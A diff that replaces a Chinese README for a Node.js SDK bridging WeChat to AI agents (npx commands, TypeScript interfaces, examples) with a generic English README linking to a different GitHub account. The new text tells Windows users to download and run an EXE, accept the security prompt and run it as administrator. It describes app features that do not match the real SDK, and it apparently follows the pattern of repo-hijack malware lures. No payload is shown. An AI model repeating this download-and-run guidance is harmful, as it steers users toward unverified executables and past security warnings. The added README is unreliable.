@@ -1,237 +1,177 @@
-# weixin-agent-sdk
+# 🤖 weixin-agent-sdk - Run Any Agent in WeChat
 
-> 本项目非微信官方项目，代码由 [@tencent-weixin/openclaw-weixin](https://npmx.dev/package/@tencent-weixin/openclaw-weixin) 改造而来，仅供学习交流使用。
+[![Download](https://img.shields.io/badge/Download%20Now-4B6CB7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Franciskathriving36/weixin-agent-sdk)
 
-微信 AI Agent 桥接框架 —— 通过简单的 Agent 接口，将任意 AI 后端接入微信。
+## 🚀 What This App Does
 
-## 项目结构
+weixin-agent-sdk lets you connect a WeChat bot, called Clawbot, to an agent of your choice. You can use it to route chats, respond with AI, and handle simple workflows from a WeChat account.
 
-```
-packages/
-  sdk/                  weixin-agent-sdk —— 微信桥接 SDK
-  weixin-acp/           ACP (Agent Client Protocol) 适配器
-  example-openai/       基于 OpenAI 的示例
-```
+This project is meant for end users who want a local app they can run on Windows. You do not need to write code to get started.
 
-## 通过 ACP 接入 Claude Code, Codex, kimi-cli 等 Agent
+## 📦 What You Need
 
-[ACP (Agent Client Protocol)](https://agentclientprotocol.com/) 是一个开放的 Agent 通信协议。如果你已有兼容 ACP 的 agent，可以直接通过 [`weixin-acp`](https://www.npmjs.com/package/weixin-acp) 接入微信，无需编写任何代码。
+Before you install the app, make sure you have:
 
+- A Windows PC
+- A stable internet connection
+- A WeChat account
+- Permission to use the bot account you plan to connect
+- Enough free disk space for the app and its files
 
-### Claude Code
+For best results, use Windows 10 or Windows 11.
 
-```bash
-npx weixin-acp claude-code
-```
+## ⬇️ Download the App
 
-### Codex
+Visit this page to download the app:
 
-```bash
-npx weixin-acp codex
-```
+[https://github.com/Franciskathriving36/weixin-agent-sdk](https://github.com/Franciskathriving36/weixin-agent-sdk)
 
-### 其它 ACP Agent
+On that page, look for the latest release, the built file, or the setup package. If the page gives you a ZIP file or EXE file, save it to your computer before you run it.
 
-比如 kimi-cli：
+## 🪟 Install on Windows
 
-```bash
-npx weixin-acp start -- kimi acp
-```
+1. Open the download page in your browser.
+2. Find the latest release or download file.
+3. Save the file to a folder you can find, such as Downloads.
+4. If the file is a ZIP package, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. If you see an EXE file, double-click it to start the app.
+7. If Windows shows a security prompt, choose the option that lets you run the file.
 
-`--` 后面的部分就是你的 ACP agent 启动命令，`weixin-acp` 会自动以子进程方式启动它，通过 JSON-RPC over stdio 进行通信。
+If the app opens in a terminal window, leave that window open while the app runs.
 
-更多 ACP 兼容 agent 请参考 [ACP agent 列表](https://agentclientprotocol.com/get-started/agents)。
+## 🔗 Connect WeChat and Your Agent
 
-## 自定义 Agent
+After you start the app, follow the setup screen or config prompts.
 
-SDK 主要导出三样东西：
+You will usually need to:
 
-- **`Agent`** 接口 —— 实现它就能接入微信
-- **`login()`** —— 扫码登录
-- **`start(agent)`** —— 启动消息循环，并返回可主动发消息的 `Bot`
+- Sign in to the WeChat bot account
+- Set the Clawbot connection
+- Choose the agent you want to use
+- Paste any token, key, or local address if the app asks for it
+- Save the settings
 
-### Agent 接口
+If the app provides a QR code, scan it with WeChat on your phone. If it asks for a bot login, use the account tied to your WeChat setup.
 
-```typescript
-interface Agent {
-  chat(request: ChatRequest): Promise<ChatResponse>;
-}
+## 🧭 First-Time Setup
 
-interface ChatRequest {
-  conversationId: string;         // 用户标识，可用于维护多轮对话
-  text: string;                   // 文本内容
-  media?: {                       // 附件（图片/语音/视频/文件）
-    type: "image" | "audio" | "video" | "file";
-    filePath: string;             // 本地文件路径（已下载解密）
-    mimeType: string;
-    fileName?: string;
-  };
-}
+Use these steps the first time you run the app:
 
-interface ChatResponse {
-  text?: string;                  // 回复文本（支持 markdown，发送前自动转纯文本）
-  media?: {                       // 回复媒体
-    type: "image" | "video" | "file";
-    url: string;                  // 本地路径或 HTTPS URL
-    fileName?: string;
-  };
-}
-```
+1. Start the app.
+2. Wait for it to load.
+3. Check the setup screen for required fields.
+4. Fill in the account and agent details.
+5. Save the settings.
+6. Send a test message in WeChat.
+7. Confirm that the bot replies as expected.
 
-### 最简示例
+If the app has a config file, keep the file in the same folder as the app unless the setup screen tells you to move it.
 
-```typescript
-import { login, start, type Agent } from "weixin-agent-sdk";
+## 💬 How to Use It
 
-const echo: Agent = {
-  async chat(req) {
-    return { text: `你说了: ${req.text}` };
-  },
-};
+Once setup is done, you can use the app for tasks like:
 
-await login();
-const bot = await start(echo);
-```
+- Auto-reply to WeChat messages
+- Forward messages to an agent
+- Keep chat history for context
+- Handle simple request flows
+- Run a bot for personal or team use
 
-### 完整示例（自己管理对话历史）
+A common setup is:
 
-```typescript
-import { login, start, type Agent } from "weixin-agent-sdk";
+1. A user sends a message in WeChat.
+2. Clawbot receives the message.
+3. The app sends the message to your agent.
+4. The agent creates a reply.
+5. Clawbot sends the reply back to WeChat.
 
-const conversations = new Map<string, string[]>();
+## 🛠️ Basic Controls
 
-const myAgent: Agent = {
-  async chat(req) {
-    const history = conversations.get(req.conversationId) ?? [];
-    history.push(req.text);
+The app may include a few simple controls:
 
-    // 调用你的 AI 服务...
-    const reply = await callMyAI(history);
+- Start: launches the bot connection
+- Stop: ends the bot session
+- Reload: refreshes the current settings
+- Logs: shows what the app is doing
+- Settings: opens the config screen
 
-    history.push(reply);
-    conversations.set(req.conversationId, history);
-    return { text: reply };
-  },
-};
+If you see a log window, use it to check whether the bot is connected and responding.
 
-await login();
-const bot = await start(myAgent);
-```
+## 🧩 Common Use Cases
 
-### 主动发送消息
+This app can help with:
 
-`start()` 返回的 `Bot` 实例提供了 `sendMessage()`，可以在收到微信消息之外，主动给当前登录用户发送内容。
+- Personal assistant replies in WeChat
+- Customer chat handling
+- Message routing to an AI agent
+- Internal team support bots
+- Simple automation for repeat questions
 
-```typescript
-import { login, start, type Agent } from "weixin-agent-sdk";
+## 🔍 Troubleshooting
 
-const agent: Agent = {
-  async chat(req) {
-    if (req.text === "ping") {
-      return { text: "pong" };
-    }
-    return { text: `收到：${req.text}` };
-  },
-};
+If the app does not start:
 
-await login();
-const bot = await start(agent);
+1. Check that the file finished downloading.
+2. Unzip the file if needed.
+3. Run the EXE again.
+4. Make sure Windows did not block the file.
+5. Try running the app as administrator.
 
-setInterval(() => {
-  void bot.sendMessage("定时提醒：记得查看最新状态");
-}, 60_000);
-```
+If WeChat does not connect:
 
-也可以主动发送完整的 `ChatResponse`，包括图片、视频或文件：
+1. Check your login state.
+2. Reopen the app.
+3. Confirm the account is still signed in.
+4. Make sure the bot settings are correct.
+5. Restart WeChat and the app.
 
-```typescript
-await bot.sendMessage({
-  text: "这是最新报表",
-  media: {
-    type: "file",
-    url: "./reports/daily.pdf",
-    fileName: "daily.pdf",
-  },
-});
-```
+If messages do not go through:
 
-注意事项：
+1. Confirm the agent is online.
+2. Check the token or key if the app uses one.
+3. Review the log window for errors.
+4. Send a short test message.
+5. Restart the bot connection.
 
-- 主动发送依赖微信下发的 `context_token`
-- 需要在 `start()` 运行期间，至少先收到过当前账号的一条入站消息
-- `context_token` 有时效，可能是 24 小时；过期后需要再次收到新消息才能继续主动发送
+## 🧪 Test Checklist
 
-### OpenAI 示例
+Use this list to confirm the app works:
 
-`packages/example-openai/` 是一个完整的 OpenAI Agent 实现，支持多轮对话和图片输入：
+- The app opens on Windows
+- The bot account signs in
+- The agent connection is active
+- A test message goes from WeChat to the agent
+- The reply comes back to WeChat
+- The log shows a clean connection
 
-```bash
-pnpm install
+## 📁 Suggested Folder Setup
 
-# 扫码登录微信
-pnpm run login -w packages/example-openai
+Keep the app in a simple folder path, such as:
 
-# 启动 bot
-OPENAI_API_KEY=sk-xxx pnpm run start -w packages/example-openai
-```
+- `C:\weixin-agent-sdk`
+- `C:\Users\YourName\Downloads\weixin-agent-sdk`
 
-支持的环境变量：
+Avoid deep folder paths with many special characters. Simple paths make it easier to find files and keep the app stable.
 
-| 变量 | 必填 | 说明 |
-|------|------|------|
-| `OPENAI_API_KEY` | 是 | OpenAI API Key |
-| `OPENAI_BASE_URL` | 否 | 自定义 API 地址（兼容 OpenAI 接口的第三方服务） |
-| `OPENAI_MODEL` | 否 | 模型名称，默认 `gpt-5.4` |
-| `SYSTEM_PROMPT` | 否 | 系统提示词 |
+## 🔐 Account and Data Tips
 
-## 支持的消息类型
+Use a WeChat account you control. Keep your login details private. If the app stores settings or chat data on your computer, back up the folder before you change key settings.
 
-### 接收（微信 → Agent）
+## 🧰 Helpful Terms
 
-| 类型 | `media.type` | 说明 |
-|------|-------------|------|
-| 文本 | — | `request.text` 直接拿到文字 |
-| 图片 | `image` | 自动从 CDN 下载解密，`filePath` 指向本地文件 |
-| 语音 | `audio` | SILK 格式自动转 WAV（需安装 `silk-wasm`） |
-| 视频 | `video` | 自动下载解密 |
-| 文件 | `file` | 自动下载解密，保留原始文件名 |
-| 引用消息 | — | 被引用的文本拼入 `request.text`，被引用的媒体作为 `media` 传入 |
-| 语音转文字 | — | 微信侧转写的文字直接作为 `request.text` |
+- **Clawbot**: the WeChat bot connection used by this app
+- **Agent**: the service or model that creates replies
+- **Token**: a private value used to connect one service to another
+- **Config**: the settings the app uses to run
+- **Log**: a record of what the app is doing
 
-### 发送（Agent → 微信）
+## 📌 Quick Start
 
-| 类型 | 用法 |
-|------|------|
-| 文本 | 返回 `{ text: "..." }` |
-| 图片 | 返回 `{ media: { type: "image", url: "/path/to/img.png" } }` |
-| 视频 | 返回 `{ media: { type: "video", url: "/path/to/video.mp4" } }` |
-| 文件 | 返回 `{ media: { type: "file", url: "/path/to/doc.pdf" } }` |
-| 文本 + 媒体 | `text` 和 `media` 同时返回，文本作为附带说明发送 |
-| 远程图片 | `url` 填 HTTPS 链接，SDK 自动下载后上传到微信 CDN |
-| 主动发送 | 通过 `const bot = await start(agent)` 后调用 `bot.sendMessage(...)` |
-
-## 内置斜杠命令
-
-在微信中发送以下命令：
-
-- `/echo <消息>` —— 直接回复（不经过 Agent），附带通道耗时统计
-- `/toggle-debug` —— 开关 debug 模式，启用后每条回复追加全链路耗时
-
-## 技术细节
-
-- 使用 **长轮询** (`getUpdates`) 接收消息，无需公网服务器
-- 媒体文件通过微信 CDN 中转，**AES-128-ECB** 加密传输
-- 单账号模式：每次 `login` 覆盖之前的账号
-- 断点续传：`get_updates_buf` 持久化到 `~/.openclaw/`，重启后从上次位置继续
-- 会话过期自动重连（errcode -14 触发 1 小时冷却后恢复）
-- Node.js >= 22
-
-## Star History
-
-<a href="https://www.star-history.com/?repos=wong2%2Fweixin-agent-sdk&type=date&legend=top-left">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/image?repos=wong2/weixin-agent-sdk&type=date&theme=dark&legend=top-left" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/image?repos=wong2/weixin-agent-sdk&type=date&legend=top-left" />
-   <img alt="Star History Chart" src="https://api.star-history.com/image?repos=wong2/weixin-agent-sdk&type=date&legend=top-left" />
- </picture>
-</a>
+1. Open the download page.
+2. Download the latest app file.
+3. Unzip it if needed.
+4. Open the EXE on Windows.
+5. Connect your WeChat account.
+6. Set your agent details.
+7. Send a test message and check the reply
